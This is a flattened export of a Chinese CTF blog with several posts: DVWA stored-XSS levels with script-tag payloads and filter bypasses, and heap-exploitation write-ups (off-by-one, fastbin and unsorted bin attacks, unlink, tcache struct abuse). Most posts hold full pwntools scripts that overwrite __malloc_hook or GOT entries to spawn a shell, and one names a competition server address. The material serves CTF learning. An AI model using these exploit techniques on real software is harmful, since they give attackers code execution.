更改名称 Repeater 模块选中抓取的包 -&gt; 右键 -&gt; 发送给Repeater -&gt; 点击高亮的Repeater模块 -&gt; 左上角的send按钮 -&gt; 右边会出现时相应内容 这里对name的输入也有长度限制，可以利用burp suite转包把name 改位&lt;script&gt; alert(‘name’) &lt;/script&gt; 2. medium 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 相关函数说明:strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签.addslashes() 函数返回在预定义字符(单引号，双引号，反斜杠，NULL) 之前添加反斜杠的字符串 上述代码对message参数进行了过滤， 无法通过message 注入XSS代码，但是对于name参数可以利用前面的双写绕过与大小写绕过 3. high 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; message 不可利用， 但是name参数可以通过img, ifram等其它危险的标签 注入XSS代码 4. impossiblename 与 message参数 都是使用了htmlspecialchars函数，无法利用XSS，但是如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。（目前未接触）","tags":[{"name":"XSS, DVWA","slug":"XSS-DVWA","permalink":"http://wafuter.jxustctf.top/tags/XSS-DVWA/"}]},{"title":"Hgame Eggplant_note write up","date":"2020-03-17T08:07:11.000Z","path":"2020/03/17/Hgame-Eggplant-note-write-up/","text":"不是很有心情啃难题，就日常水博客了… 漏洞点 比较明显的 off-by-one 漏洞利用保护全开， 有个off-by-one漏洞，关于note的操作都齐了， 那么做法就比较常规了 通过off-by-one漏洞修改 chunk 的size，再通过其它操作是unsorted bin中的 chunk 与 heap中的chunk重叠造成 chunk overlap， 之后就是泄露libc地址与 fast bin attack了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./Eggplant_note\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def free(idx): p.sendlineafter(\":\", str(2)) p.sendlineafter(\"index?\", str(idx)) def show(idx): p.sendlineafter(\":\", str(3)) p.sendlineafter(\"index?\", str(idx)) def edit(idx, content): p.sendlineafter(\":\", str(4)) p.sendlineafter(\"index?\", str(idx)) p.sendafter(\"content:\", content) add(0x18, '\\n') # 0 add(0x18, '\\n') # 1 add(0x68, '\\n') # 2 add(0x48, '\\n') # 3 edit(0, '\\x00'*0x18 + '\\x91') free(1) add(0x18, '\\n') # 1 add(0x68, '&gt;'*7 + '\\n') # 4 show(4) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p.recvuntil('&gt;'*7) leak = u64(p.recv(7)[1:].ljust(8, '\\x00')) libc_base = leak - (0x7fcb51a67b78 - 0x7fcb516a3000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] log.success(\"libc_base -&gt; \" + hex(libc_base)) free(4) edit(2, p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\n') add(0x68, '\\x00'*0x13 + p64(libc_base+one_gadget[3]) + '\\n') log.info(\"one_gadget -&gt; \" + hex(libc_base + one_gadget[3])) p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(1)) p.interactive()if __name__ == '__main__': pwn() 结果:","tags":[{"name":"Hgame2020， chunk overlap","slug":"Hgame2020，-chunk-overlap","permalink":"http://wafuter.jxustctf.top/tags/Hgame2020%EF%BC%8C-chunk-overlap/"}]},{"title":"2019护网杯 flower复现","date":"2020-03-14T14:21:17.000Z","path":"2020/03/14/2019护网杯-flower复现/","text":"学习的是Ex师傅的博客http://blog.eonew.cn/archives/1212 漏洞点 这里有个null by one 漏洞 由于程序限制的v2的大小只能小于等于0x58, 所以就不能通过常规的的方法分配chunk到unsorted中泄露libc地址， 通过伪造0x7fsize的chunk来进行fast bin attack， 这里触及到我的知识盲区了 利用scanf使fast bin中的chunk合并进入unsorted bin当 top_chunk 不够时， 或者申请了一个 large bin, 也就是size大于0x400的 chunk 就能触发 malloc_consolidate， 使得 fast bin 合并，并且放入 unsorted bin中. 这里用到了一个缓冲机制，当 scanf 的缓冲区不够用时， 就会 malloc 一块更大的chunk来充当缓冲区， 然后使用完之后再 free 掉， 当输入大于 0x400 时， 会申请一块大于 0x400 的 chunk 来当缓冲区, 正是这个申请可以触发 malloc_consolidate 解题思路1.利用 scanf 的缓冲机制， 使输入的长度大于0x400, 那么就会触发malloc_solidate来时fast bin中的 chunk 合并进入unsortedbin中， 后续便可以泄露libc地址 2.泄露了libc地址 要考虑的就是如何覆写malloc_hook， 既然无法利用 fastbin attack ， 那么可以考虑利用改写 top_chunk 为 malloc_hook附近的地址， 难点在于 如何构造 chunk overlap 构造chunk overlap前面已经使fast bin中的 chunk 合并进入 unsorted bin 中了， 那么可以先申请一个大小为chunk， 填满data区， 使得下一个chunk的size的低位字节被覆盖成’\\x00’, 后续再分配几个 chunk , 为了后面的chunk overlap做准备 12345678910111213141516for i in range(6): add(0x58, i, '\\n')for i in range(5): free(i)add(0x28, '4', '\\n')p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) //触发malloc_solidateadd(0x58, 0, '\\x00'*0x58) //将下一个chunk的sie的低位字节置为零创造一个大小为0x100的chunkadd(0x18, 1, '111')add(0x50, 2, '222')add(0x38, 3, '333')free(1) // 这两个free语句为后续的malloc_solidate创造一个新的合并的fastbin的chunkfree(5) // 方便后续 chunk overlap(堆块重叠)p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) 改写top_chunk准备好 chunk overlap 的条件后就是改写 top_chunk了， 总之先泄露libc地址， 之后利用 chunk overlap往fast bin中的chunk 写入main_arena的地址， 这个地址需要实现free一个chunk， 这样中main_arena就会存在一个0x55xxxx…的地址(对应fastbin 链表的表头指针)， 开头字节0x55就是我们需要伪造的chunk的size 写入成功后将分配 chunk 到main_arena中，覆盖 top_chunk 为 &lt;_IO_wide_data_0+296&gt; 处的地址， 为什么是这个地址？ 因为这个地方有一个 天然的size 覆盖成功后再分配几个 chunk 将unsorted bin中的chunk清空， 之后从 top_chunk 分配的时候将one_gadget与realloc的地址写入就可以getshell了 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./flower\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, idx, name): p.sendlineafter(\"choice &gt;&gt;\", str(1)) p.sendlineafter(\"Name of Size : \", str(size)) p.sendlineafter(\"input index: \", str(idx)) p.sendafter(\"input flower name:\", name) def free(idx): p.sendlineafter(\"choice &gt;&gt;\", str(2)) p.sendlineafter(\"input idx :\", str(idx)) def show(idx): p.sendlineafter(\"choice &gt;&gt;\", str(3)) p.sendlineafter(\"Input idx :\", str(idx)) for i in range(6): add(0x58, i, '\\n') for i in range(5): free(i) add(0x28, '4', '\\n') p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) add(0x58, 0, '\\x00'*0x58) add(0x18, 1, '111') add(0x50, 2, '222') add(0x38, 3, '333') free(1) free(5) p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) add(0x48, 1, '1234567' + '\\n') add(0x48, 5, '444') add(0x58, 0, '\\x05\\x05\\x05') show(1) p.recvuntil(\"1234567\\x0a\") leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7fae97541d48 - 0x7fae9717d000) log.success(\"libc_base -&gt; \" + hex(libc_base)) free(5) free(2) free(4) main_arena = libc_base + 0x3c4b20 log.success(\"main_arena -&gt; \" + hex(main_arena)) add(0x58, 2, '\\x00'*0x28 + p64(0x51) + p64(main_arena + 0xd) + '\\n') add(0x48, 2, '\\n') add(0x48, 2, '\\x00' * 0x3b + p64(main_arena - 0x28)) log.success(\"fake_addr -&gt; \" + hex(main_arena - 0x28)) log.success(\"main_arena -&gt; \" + hex(main_arena)) try: libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") add(0x50, 2, '\\n') add(0x50, 2, '\\n') raw_input() add(0x50, 2, p64(libc_base + 0xf1147) + p64(libc_base + libc.symbols['__libc_realloc'] + 20)) raw_input() p.sendlineafter(\"choice &gt;&gt;\", str(1)) p.sendlineafter(\"Name of Size : \", str(1)) p.sendlineafter(\"input index: \", str(1)) except EOFError: p.close() pwn() p.interactive()if __name__ == '__main__': pwn() 结果： 再记录一下遇到的坑 在考虑改写 top_chunk 的时候想过直接往main_arena中写入0x61, 这样就能直接分配了不用额外free chunk和考虑概率的问题， 但是在最后一步的时候要覆盖 realloc_hook和malloc_hook 的时候会在 &lt;malloc_solidate+296&gt; 这个地方报错 显示的是错误的地址 0x69, 观察了一下寄存器， rbx的寄存器的值为 0x61, 刚好就是写入 main_arena的数值， 不知道什么原因就跟着Ex师傅的博客的思路区复现了","tags":[{"name":"2019护网杯， malloc_consolidate","slug":"2019护网杯，-malloc-consolidate","permalink":"http://wafuter.jxustctf.top/tags/2019%E6%8A%A4%E7%BD%91%E6%9D%AF%EF%BC%8C-malloc-consolidate/"}]},{"title":"结合2019 省赛题目 lllheap 对unlink的初步理解","date":"2020-03-13T07:35:47.000Z","path":"2020/03/13/unlink原理-初步理解/","text":"small bin中的 unlinkunlink 就是chunk在解链时会进行的一个操作, 设要触发unlink的chunk的地址为p， 指向这个chunk的地址为ptr 12345FD = p-&gt;fd;BK = p-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD; 但是要利用unlink 还需要绕过两个保护 检查大小12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); 如果 要触发unlink的chunk 的下一个chunk的prev_size 不符合 要触发unlink的chunk 的size的则会报出corrupted size vs. prev_size 错误 检查FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (\"corrupted double-linked list\"); 如何绕过这两个保护1.绕过大小保护 通常可以通过堆溢出 或 null by one来伪造chunk来绕过大小保护 2.绕过链接关系检查 从这开始-&gt;表示指向关系, 不代表结构体指针的-&gt; 根据假设情况有 ptr -&gt; p再具体一点假设ptr = 0x602070 为bss段的某个地址， 存放要触发unlink的chunk的地址 p = 0x20f4000 为要触发unlink的chunk的地址 由于要绕过链接关系检查， 那么要控制FD-&gt;bk == p 以及 BK-&gt;fd == p p的fd与bk指针 均指向chunk头地址 -&gt; prev_size | size fd | bk … prev_size | size 那么 12345FD = p-&gt;fd = *(p + 0x10)BK = p-&gt;bk = *(p + 0x18)FD-&gt;bk 等价于 *( *(p + 0x10) + 0x18)BK-&gt;fd 等价于 *( *(p + 0x18) + 0x10) 如果控制FD = p-&gt;fd = ptr - 0x18BK = p-&gt;bk = ptr - 0x10那么FD-&gt;bk = *( ptr - 0x18 + 0x18) = pBK-&gt;fd = *( ptr - 0x10 + 0x10) = p 这样就达成了目的， 成功绕过了链接关系检查 进行unlink绕过前面两个检查后就会进行unlink了 12FD-&gt;bk = BKBK-&gt;fd = FD 根据前面伪造的fd与bk指针， 上面的操作等同于 *( ptr - 0x18 + 0x18) = ptr - 0x10;*( ptr - 0x10 + 0x10) = ptr - 0x18; 最终会往ptr 中写入 ptr - 0x18 这样再lllheap 这道题目中就可以结合edit函数 改变存放在bss 段的chunk地址为malloc_hook的地址， 再利用edit函数往malloc_hook 写入one_gadget来getshell 相关链接:https://blog.csdn.net/qq_43189757/article/details/103483140","tags":[{"name":"unlink","slug":"unlink","permalink":"http://wafuter.jxustctf.top/tags/unlink/"}]},{"title":"XCTF 新春战疫 woodenbox2 writeup && easyheap 复现","date":"2020-03-10T07:00:35.000Z","path":"2020/03/10/XCTF-新春战疫-woodenbox2-writeup-easyheap-复现/","text":"easyheap 复现 漏洞点在add函数中，如果输入的size大于1024的话那么就只会malloc一个大小为0x20的chunk， 不会进行后续的操作 如何利用？ add函数中创建的结构为 1234struct node &#123; struct node \\*content; int size;&#125; 固定的malloc(0x10) 用来存放node节点后面的malloc(nbytes) 是node.content 如果可以控制某个node的content指针指向其它某个chunk，那么就可以控制那个chunk的content指针再配合edit函数可以造成任意地址写， 有了任意地址写那么第一步就是改写free函数的got表为puts的plt表泄露出libc地址， 第二步改写atoi函数的got表为system的地址， 随后输入/bin/sh即可getshell 再补充一个以前没有注意到的知识点, 在fast bin中的链表中，当有chunk从fast bin中取出来的时候这个chunk的fd和bk指针不会改变 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./easyheap\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"How long is this message?\", str(size)) p.sendafter(\"What is the content of the message?\", content) def addNoContent(size): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"How long is this message?\", str(size)) def free(idx): p.sendlineafter(\"Your choice:\", str(2)) p.sendlineafter(\"What is the index of the item to be deleted?\", str(idx)) def edit(idx, content): p.sendlineafter(\"Your choice:\", str(3)) p.sendlineafter(\"What is the index of the item to be modified?\", str(idx)) p.sendafter(\"What is the content of the message?\", content) elf = ELF(\"./easyheap\") libc = ELF(\"./xctf_eh_libc.so.6\") free_got = elf.got['free'] puts_plt = elf.plt['puts'] add(0x18, p64(0xf0)*3) #0 free(0) addNoContent(0x500) #0.node add(0x18, p64(free_got)) # 1 -&gt; 0.content free(1) addNoContent(0x500) # 1.node -&gt; 0.content add(0x18, '\\n') # 2 edit(1, p64(0) + p64(0x21) + p64(free_got)) edit(2, p64(puts_plt)) edit(1, p64(0) + p64(0x21) + p64(elf.got['puts'])) free(2) p.recvline() leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7f657bccc690 - 0x7f657bc5d000) log.info(\"libc_base -&gt; \" + hex(libc_base)) edit(0, p64(0) + p64(0x21) + p64(elf.got['atoi'])) edit(1, p64(libc_base + libc.symbols['system'])) p.sendlineafter(\"Your choice:\", '/bin/sh\\0') p.interactive()if __name__ == '__main__': pwn() 复现成功: woodenbox2 wirteup 此处重新输入的size没有作限制， 所以有了很方便的堆溢出， 但是由于程序中没有show之类的函数， 所以需要控制IO_2_1_stdout_结构体来泄露libc地址， 可以利用堆溢出使一个chunk即位于fast bin中又位于unsorted bin中， 之后再控制chunk的fd指针的低两个字节为’\\xdd\\x25’, 但是由于地址随机化的原因1/16的概率可以成功， 泄露libc地址后就是常规的fast bin attack 了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./woodenbox2\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"121.36.215.224\" host = \"9998\" p = remote(ip, host) def add(size, content): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"Please enter the length of item name:\", str(size)) p.sendafter(\"Please enter the name of item:\", content) def edit(idx, size, content): p.sendlineafter(\"Your choice:\", str(2)) p.sendlineafter(\"Please enter the index of item:\", str(idx)) p.sendlineafter(\"Please enter the length of item name:\", str(size)) p.sendlineafter(\"Please enter the new name of the item:\", content) def free(idx): p.sendlineafter(\"Your choice:\", str(3)) p.sendlineafter(\"Please enter the index of item:\", str(idx)) add(0x68, '\\n') #0 add(0x18, '\\n') #1 add(0x68, '\\n') #2 add(0x68, '\\n') #3 -&gt; 1 edit(0, 0x90, '\\x00'*0x68 + p64(0x91) + '\\n') edit(2, 0x90, p64(0x21)*2*6) free(1) free(1) add(0x18, '\\n') # -&gt; 0 edit(0, 0x22, '\\x00'*0x18 + p64(0x71) + '\\xdd\\x25') add(0x68, '\\n') # -&gt; 2 add(0x68, '\\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\\x00') # -&gt; 3 elf = ELF(\"./woodenbox2\") libc = ELF(\"libc6_2.23-0ubuntu11_amd64.so\") p.recvuntil(p64(0xfbad1800)) p.recv(24) leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7ffff7dd2600 - 0x7ffff7a0d000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] log.info(\"libc_base -&gt; \" + hex(libc_base)) add(0x68, '\\n') # -&gt; 4 add(0x68, '\\n') # -&gt; 5 add(0x68, '\\n') # -&gt; 6 free(5) edit(3, 0xf0, '\\x00'*0x68 + p64(0x71) + '\\x00'*0x68 + p64(0x71) + p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\n') add(0x68, '\\x00'*(0x13 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc + 6)) p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"Please enter the length of item name:\", str(0x20)) p.interactive()if __name__ == \"__main__\": pwn() flag:","tags":[{"name":"IO_2_1_stdout, fast bin","slug":"IO-2-1-stdout-fast-bin","permalink":"http://wafuter.jxustctf.top/tags/IO-2-1-stdout-fast-bin/"}]},{"title":"Hgame 2020 第三周 Annevi writeup","date":"2020-03-06T08:29:43.000Z","path":"2020/03/06/Hgame-2020-第三周-Annevi-writeup/","text":"漏洞点 1.由于read函数在判断 i &lt; a2 之前， 所以可以多输入一位， 存在off-by-one漏洞2.在edit函数中 能输入的数据长度固定是256， 只要创建大小小于0x100的chunk 就可以造成堆溢出 解题思路:1.首先泄露libc地址可以利用off-by-one或堆溢出 修改下一个chunk的size， 修改的size小于原来的size， free掉这个chunk后，在add一个chunk 使得在unsorted bin中剩余的chunk的size等于被修改的chunk的下一个chunk的size， 之后再调用show函数即可泄露libc地址 2.由于程序中限制了add的chunk的大小只能大于0x90, 所以没办法直接利用fast bin attack控制malloc_hook 与realloc_hook我的想法是改global_max_fast 为一个很大的数， 之后free的chunk都会被归为fast bin中unsorted bin attack简单介绍:如果控制了unsorted bin中的bk指针， 之后往unsotred bin中取出chunk的时候 会执行这样一条指令bck-&gt;fd = unsorted_chunks (av);这样就可以往bk指向的内存中写入一个很大的数 改写完global_max_fast之后先利用一次 fast bin attack 往malloc_hook上方写入一个0xf1作为跳板(mall0c_hook上方存在 0xffffffffffffffff)， 再第二次利用fast bin attack中跳到第一次伪造的fake_chunk处， 之后就可以覆盖realloc_hook 与malloc_hook了 3.由于one_gadget全部失效， 需要realloc来调整栈环境 要注意的是0xffffffffffffffff 的下方有两个地址也要利用偏移求的， 不要用其它数据覆盖，以前随便覆盖的时候好像出错了.. exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./Annevi\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def free(idx): p.sendlineafter(\":\", str(2)) p.sendlineafter(\"index?\", str(idx)) def show(idx): p.sendlineafter(\":\", str(3)) p.sendlineafter(\"index?\", str(idx)) def edit(idx, content): p.sendlineafter(\":\", str(4)) p.sendlineafter(\"index?\", str(idx)) p.sendafter(\"content:\", content) add(0x98, '\\x00' + '\\n') #0 add(0x98, '\\x00' + '\\n') #1 add(0x98, p64(0x21)*2*9 + '\\n') #2 add(0xe8, '\\n') #3 add(0xe8, '\\n') #4 add(0xd8, '\\n') #5 add(0xe8, '\\n') #6 edit(0, '\\x00'*0x98 + p64(0xf1) + '\\n') free(1) add(0x98, '\\x00' + '\\n') #1 show(2) elf = ELF(\"./Annevi\") libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p.recvuntil(\"content:\") leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7fe8dc04eb78 - 0x7fe8dbc8a000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] global_max_fast = libc_base + 0x3c67f8 log.info(\"global_max_fast -&gt; \" + hex(global_max_fast)) log.info(\"libc_base -&gt; \" + hex(libc_base)) edit(2, p64(global_max_fast) + p64(global_max_fast - 0x10) + '\\n') edit(1, '\\x00'*0x98 + p64(0xa1) + '\\n') add(0x98, '\\n') # 7 modify global_max_fast fake_chunk = libc_base + 0x3c496f addr1 = libc_base + 0x3c49c0 addr2 = libc_base + 0x3c36e0 free(3) edit(2, '\\x00'*0x98 + p64(0xf1) + p64(fake_chunk) + '\\n') log.info(\"fake_chunk -&gt; \" + hex(fake_chunk)) add(0xe8, '\\n') # 3 add(0xe8, '\\n') # 8 edit(8, '\\x00' + p64(addr1) + p64(0)*6 + p64(addr2) + '\\x00' + '\\x00'*0xa6 + p64(0xe1) + '\\n') fake_chunk2 = libc_base + 0x3c4a5f free(5) edit(4, '\\x00'*0xe8 + p64(0xe1) + p64(fake_chunk2) + '\\n') add(0xd8, '\\n') #4 add(0xd8, '\\x00'*(0xa1 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc + 8) + '\\n') log.info(\"one_gadget -&gt; \" + hex(libc_base + one_gadget[3])) #raw_input() p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(0x90)) p.interactive()if __name__ == '__main__': pwn() 结果:","tags":[{"name":"unsorted bin attack, 修改global_max_fast","slug":"unsorted-bin-attack-修改global-max-fast","permalink":"http://wafuter.jxustctf.top/tags/unsorted-bin-attack-%E4%BF%AE%E6%94%B9global-max-fast/"}]},{"title":"v&n 招新赛 simpleHeap writeup(未成功)","date":"2020-03-04T13:52:36.000Z","path":"2020/03/04/v-n-招新赛-simpleHeap-writeup-未成功/","text":"这题我真是裂开了 先是没看清ubuntu的版本， 以为是ubuntu18的， 然后按照tcache bin的libc去做， 最后终于写出exp， 将malloc_hook与realloc_hook成功覆盖， 之后不知道为什么总会在printf中程序崩溃.., 无法执行到malloc也就无法攻击, 实在找不出原因后去找wp， 看到fast binattack满头问号， 之后再去看题目发现是libc2.23.., 是libc2.23 的话就比libc2.27 简单多了 然而当我又一次写出exp的时候，又成功把realloc_hook与malloc_hook 给覆盖了， 最后运行的时候还是在call printf 的过程中程序崩溃.., 之后试了直接打远程， 跟本地是一样的情况， 那么只能是我的操作问题了， 或许是某个不好的习惯， 但实在找不出来了， 只能先鸽了，先把经验写了 2.23 在ubuntu18 中编写exp中碰到的问题总结1.如果 某个chunk在unsortedbin 与tcache bin中同时存在， 那么在malloc的时候会先取tcache bin中的chunk2.x/i 命令查看汇编指令3.tcache bin 中的chunk不会作size检查， 所以只创建一个chunk符合tcache bin的大小的话会直接进入tcache bin中， 但如果符合unsorted bin中的话就要伪造chunk使其不会与 top_chunk 合并了4.tcache bin 存放的chunk 指针 是data区的指针 realloc函数的部分汇编指令 本题解题思路漏洞： 存在明显的off-by-one漏洞 思路：那么只要利用off-by-one 溢出一个字节修改下一个chunk的size符合unsorted bin中的大小， 在free掉即可leak出libc地址，要注意的是不要让这个fake size与 top_chunk合并, 之后让这个fake chunk 同时存在于 unsorted bin 于fast bin中， 这样就可以修改fast bin中的chunk的fd指针， 之后就是fast bin attack 覆盖malloc_hook 失败的exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import sysimport os#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level = 'debug'debug = 1exceve = \"./vn_pwn_simpleHeap\"def pwn(): if debug == 1: p = process(exceve) if sys.argv[1] == '1': gdb.attach(p) else: ip = \"node3.buuoj.cn\" port = \"27552\" p = remote(ip, port) def add(size, content): p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def edit(idx, content): p.sendlineafter(\"choice: \", str(2)) p.sendlineafter(\"idx?\", str(idx)) p.sendafter(\"content:\", content) def show(idx): p.sendlineafter(\"choice: \", str(3)) p.sendlineafter(\"idx?\", str(idx)) def free(idx): p.sendlineafter(\"choice: \", str(4)) p.sendlineafter(\"idx?\", str(idx)) add(0x38, '\\x00') #0 add(0x38, '\\x00') #1 add(0x68, '\\x00') #2 add(0x21, '\\x00') #3 edit(0, '\\x00'*0x38 + '\\xB1') free(1) add(0x38, '\\x00') # 1 show(2) elf = ELF(\"./vn_pwn_simpleHeap\") libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7feecccdeb78 - 0x7feecc91a000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] add(0x68, '\\x00') # 4 free(4) edit(2, p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\x00') #4 add(0x68, '\\x00') #5 edit(5, '\\x00'*(0x13 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc) + '\\n') log.info(\"libc_base -&gt; \" + hex(libc_base)) log.info(\"realloc -&gt; \" + hex(realloc)) log.info(\"one_gadget -&gt;\" + hex(libc_base + one_gadget[0])) raw_input() p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(0x38))if __name__ == '__main__': pwn()","tags":[{"name":"pwn, off-by-one","slug":"pwn-off-by-one","permalink":"http://wafuter.jxustctf.top/tags/pwn-off-by-one/"}]},{"title":"v&n招新赛 easyTHeap 复现","date":"2020-03-01T16:42:48.000Z","path":"2020/03/02/v-n招新赛-easyTHeap-复现/","text":"程序逻辑分析： 堆题， 对于堆的基本操作都有了， 但是作了比较多的限制， 输入的chunk的size只能为0~0x100， delete操作只能进行3次， add操作只能进行7次 由于这些限制， 就不能通过常规的释放7次chunk填满tcache bin的方法来让chunk进入unsortedbin中， 这里用到的是对tcache struct的攻击tcache struct 的结构， tcache结构体是用_int_malloc函数进行分配内存空间的, 所以tcache结构体位于堆中， 而不在main_arena中 12345typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS];//0x40个字节， 每个字节都是不同大小的tcache bin中的chunk的个数 tcache_entry \\*entries[TCACHE_MAX_BINS];//0x40 ， 每八个字节对应不同大小的tcache bin中的链表头指针&#125; tcache_perthread_struct; 在pwndbg中使用vmmap 查看heap的地址， 再用x 指令查看内存中的内容, 可以发现tcache struct 的结构其实就是一个大小为0x250的chunk 标号1 方框的内容就是 char counts[TCACHE_MAX_BINS], 这里我用’\\xff’ 填充了， 这样让tcache_conunts达到最大， 之后符合unsortedbin大小的chunk经过free后就会进入unsorted bin中地址0x5640b8256010 的第一个字节的大小对应 tcache bin[20]的chunk的个数， 之后依次类推地址0x556f49cf6050 以8个字节为单位， 依次对应每个tceche bin 的头指针，也就是tcache_entry 那么解本题的思路为1.首先进行double free 再结合uaf漏洞， 可以获得tcache struct的地址并且可以控制这块内存， 之后把全部bin的counts填满到最大， 之后再把这个chunk free后即可泄露libc地址2.接下来就是如何控制malloc_hook, 